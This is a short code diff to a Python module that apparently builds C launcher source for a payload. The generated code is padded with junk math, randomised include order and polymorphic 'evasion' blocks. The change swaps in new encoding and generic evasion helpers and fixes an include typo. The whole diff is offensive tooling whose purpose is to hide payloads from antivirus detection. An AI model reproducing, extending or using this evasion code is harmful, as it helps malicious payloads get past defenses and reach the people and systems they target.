@@ -23,6 +23,8 @@ from random import shuffle
 sys.path.append("Modules/payloads/auxiliar")
 from usefull import varname_creator
 from usefull import Junkmathinject
+from usefull import encoding_manager
+from usefull import generic_evasion
 from usefull import readpayload_exfile
 
 Payload = readpayload_exfile()
@@ -61,15 +63,15 @@ Junkcode_13 = Junkmathinject()
 Junkcode_14 = Junkmathinject()
 Junkcode_15 = Junkmathinject()
 
-MorphEvasion1 = Polymorph_Multipath_Evasion()
-MorphEvasion2 = Polymorph_Multipath_Evasion()
-MorphEvasion3 = Polymorph_Multipath_Evasion()
+MorphEvasion1 = generic_evasion()
+MorphEvasion2 = generic_evasion()
+MorphEvasion3 = generic_evasion()
 
 Hollow_code = ""
 
-Include_List = ["#include <stdlib.h>\n","##include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n"]
+Include_List = ["#include <stdlib.h>\n","#include <unistd.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <sys/mman.h>\n","#include <math.h>\n"]
 
-random.shuffle(Include_List)
+shuffle(Include_List)
 
 for i in range(0,len(Include_List)):
 
